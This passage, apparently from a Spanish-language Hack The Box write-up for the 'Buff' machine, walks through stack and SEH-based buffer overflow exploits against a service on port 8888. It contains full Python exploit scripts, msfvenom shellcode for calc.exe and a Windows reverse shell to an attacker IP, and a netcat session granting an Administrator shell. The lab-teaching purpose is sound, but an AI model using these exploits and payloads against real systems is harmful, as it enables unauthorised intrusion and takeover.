+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x63\x2e\x65\x78\x65\x00</span><span class="s">"</span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">callesp </span><span class="o">+ </span><span class="p">shellcode
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">8888</span><span class="p">)
+shell.sendline(payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit el programa se detiene y abre una <code class="language-plaintext highlighter-rouge">calculadora</code> en el equipo</p>
+<a href="/htb/buff/13.png" target="_blank"><div><p><img src="/htb/buff/13.png"></p></div></a>
+
+<p class="plain-text">Ya que podemos ejecutar comandos con este exploit solo nos queda generar un nuevo shellcode usando <code class="language-plaintext highlighter-rouge">msfvenom</code> que envie una reverse shell por el puerto <code class="language-plaintext highlighter-rouge">443</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f python -v shellcode  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of python file: 1823 bytes
+shellcode =  b""
+shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
+shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
+shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
+shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
+shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
+shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
+shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
+shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
+shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
+shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
+shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
+shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
+shellcode += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
+shellcode += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
+shellcode += b"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
+shellcode += b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"
+shellcode += b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
+shellcode += b"\x6a\x05\x68\x0a\x0a\x0e\x0a\x68\x02\x00\x01"
+shellcode += b"\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74"
+shellcode += b"\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75"
+shellcode += b"\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d"
+shellcode += b"\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12"
+shellcode += b"\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"
+shellcode += b"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
+shellcode += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc"
+shellcode += b"\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
+shellcode += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2"
+shellcode += b"\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
+shellcode += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"
+shellcode += b"\x6a\x00\x53\xff\xd5"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Creamos el proxy desde la maquina victima y al correr nuestro exploit final nos envia una shell como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> donde podemos leer la flag final</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 127.0.0.1 on port 8888: Done
+[</span><span class="az">*</span><span class="p">] Closed connection to 127.0.0.1 port 8888</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.198
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32></span><span class="am">whoami</span><span class="p">
+buff\administrator
+
+C:\Windows\system32></span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt  
+c1a**************************33b
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="bof-seh">
+<br><h3 class="post-title">Buffer Overflow - SEH Based</h3><br>
+
+<p class="plain-text">Hay otra forma de explotar este programa, para ello creamos un script de python que se conecte al puerto 8888 y ahora envie <code class="language-plaintext highlighter-rouge">2500 A's</code> que son un poco mas que antes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
+
+payload </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">2500</span><span class="p">
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">8888</span><span class="p">)  
+shell.sendline(payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esta vez no solo sobreescribimos el EIP sino tambien el controlador de <code class="language-plaintext highlighter-rouge">excepciones</code>, si controlamos la direccion tambien lo que pasa cuando una ocurre la excepcion</p>
+<a href="/htb/buff/14.png" target="_blank"><div><p><img src="/htb/buff/14.png"></p></div></a>
+
+<p class="plain-text">Necesitamos encontrar la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> necesarios antes del siguiente SEH <code class="language-plaintext highlighter-rouge">controlador</code> creamos una cadena especial de <code class="language-plaintext highlighter-rouge">2500</code> caracteres usando <code class="language-plaintext highlighter-rouge">mona</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("pattern_create 2500")</span>
+</code></pre></div></div><br>
+<a href="/htb/buff/15.png" target="_blank"><div><p><img src="/htb/buff/15.png"></p></div></a>
+
+<p class="plain-text">Modificamos el script cambiando las <code class="language-plaintext highlighter-rouge">A's</code> por la cadena especialmente diseñada para encontrar un <code class="language-plaintext highlighter-rouge">offset</code>, corremos de nuevo el programa y nuevamente se corrompe</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
+
+payload </span><span class="o">= </span><span class="no">b</span><span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D"  
+</span><span class="p">
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">8888</span><span class="p">)
+shell.sendline(payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuevamente sobreescribimos el siguiente <code class="language-plaintext highlighter-rouge">SEH</code> y el controlador pero ahora con 4 bytes de toda nuestra cadena, por lo que deberiamos poder calcular el offset a este</p>
+<a href="/htb/buff/16.png" target="_blank"><div><p><img src="/htb/buff/16.png"></p></div></a>
+
+<p class="plain-text">Usando el comando exchain nos muestra el offset necesario qu eson <code class="language-plaintext highlighter-rouge">2352</code> bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("exchain")</span>
+</code></pre></div></div><br>
+<a href="/htb/buff/17.png" target="_blank"><div><p><img src="/htb/buff/17.png"></p></div></a>
+
+<p class="plain-text">Sim embargo <code class="language-plaintext highlighter-rouge">mona</code> ademas del offset nos muestra una estructura para el payload, donde como siguiente SEH usa <code class="language-plaintext highlighter-rouge">\xeb\x06</code> que es igual a un <code class="language-plaintext highlighter-rouge">jmp $+8</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[Junk * 2352] ['\xeb\x06\x41\x41'] [p/p/r] [shellcode]</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para el controlador nos dice que usemos un <code class="language-plaintext highlighter-rouge">p/p/r</code>, esto es solo una abreviación a <code class="language-plaintext highlighter-rouge">pop pop ret</code>, podemos encontrar un gadget que lo ejecute nuevamente con mona</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("seh -m qt5core.dll")</span>
+</code></pre></div></div><br>
+<a href="/htb/buff/18.png" target="_blank"><div><p><img src="/htb/buff/18.png"></p></div></a>
+
+<p class="plain-text">Nuestro payload enviara <code class="language-plaintext highlighter-rouge">A's</code> hasta antes del nseh, en el siguiente <code class="language-plaintext highlighter-rouge">SEH</code> ejecutara un <code class="language-plaintext highlighter-rouge">jmp $+8</code> usando como controlador una direccion que ejecutar un <code class="language-plaintext highlighter-rouge">pop pop ret</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32
+
+offset </span><span class="o">= </span><span class="mi">2352</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+
+nseh </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xeb\x06\x41\x41</span><span class="s">"</span><span class="p">
+seh </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x68ae9396</span><span class="p">)
+
+shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">300</span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh </span><span class="o">+ </span><span class="p">shellcode  
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">8888</span><span class="p">)
+shell.sendline(payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Cuando ocurre la excepción en el <code class="language-plaintext highlighter-rouge">EIP</code> se posicionara la direccion del controlador que ejecuta el <code class="language-plaintext highlighter-rouge">pop pop ret</code>, ahora veremos el porque funciona este gadget</p>
+<a href="/htb/buff/19.png" target="_blank"><div><p><img src="/htb/buff/19.png"></p></div></a>
+
+<p class="plain-text">Al ocurrir la excepcion esta empujara los elementos del handler al <code class="language-plaintext highlighter-rouge">stack</code>, uno de los elementos es el puntero al siguiente <code class="language-plaintext highlighter-rouge">SEH</code>, la misma direccion la vemos en <code class="language-plaintext highlighter-rouge">ESP + 8</code></p>
+<a href="/htb/buff/22.png" target="_blank"><div><p><img src="/htb/buff/22.png"></p></div></a>
+
+<p class="plain-text">Cuando se ejecuta el primer <code class="language-plaintext highlighter-rouge">pop</code> tomara <code class="language-plaintext highlighter-rouge">4</code> bytes de la pila como argumento por lo que el puntero quedara en <code class="language-plaintext highlighter-rouge">ESP + 4</code>, cuando se ejecuta el segudo <code class="language-plaintext highlighter-rouge">pop</code> toma otros <code class="language-plaintext highlighter-rouge">4</code> bytes de la pila por lo que el puntero quedará en el <code class="language-plaintext highlighter-rouge">ESP</code> antes de hacer el <code class="language-plaintext highlighter-rouge">ret</code></p>
+<a href="/htb/buff/23.png" target="_blank"><div><p><img src="/htb/buff/23.png"></p></div></a>
+
+<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">ret</code> el puntero del <code class="language-plaintext highlighter-rouge">SEH</code> quedara en el EIP por lo que interpretara el siguiente SEH que hace un <code class="language-plaintext highlighter-rouge">jmp $+8</code> para llegar a donde ahora estan las <code class="language-plaintext highlighter-rouge">C's</code></p>
+<a href="/htb/buff/20.png" target="_blank"><div><p><img src="/htb/buff/20.png"></p></div></a>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">msfvenom</code> crearemos un <code class="language-plaintext highlighter-rouge">shellcode</code> que solo nos ejecute una <code class="language-plaintext highlighter-rouge">calculadora</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/exec CMD=calc.exe -f python -v shellcode
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 193 bytes
+Final size of python file: 1095 bytes
+shellcode =  b""
+shellcode =  b""
+shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
+shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
+shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
+shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
+shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
+shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
+shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
+shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
+shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
+shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
+shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
+shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
+shellcode += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
+shellcode += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
+shellcode += b"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
+shellcode += b"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
+shellcode += b"\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c"
+shellcode += b"\x63\x2e\x65\x78\x65\x00"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El exploit final enviara basura antes de sobreescribir el siguiente <code class="language-plaintext highlighter-rouge">SEH</code>, cuando el controlador interprete el <code class="language-plaintext highlighter-rouge">pop pop ret</code> ejecutara este y saltara al shellcode</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32
+
+offset </span><span class="o">= </span><span class="mi">2352</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+
+nseh </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xeb\x06\x41\x41</span><span class="s">"</span><span class="p">
+seh </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x68ae9396</span><span class="p">)
+
+shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x63\x2e\x65\x78\x65\x00</span><span class="s">"</span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh </span><span class="o">+ </span><span class="p">shellcode
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">8888</span><span class="p">)
+shell.sendline(payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit el programa se detiene y abre una <code class="language-plaintext highlighter-rouge">calculadora</code> en el equipo</p>
+<a href="/htb/buff/21.png" target="_blank"><div><p><img src="/htb/buff/21.png"></p></div></a>
+
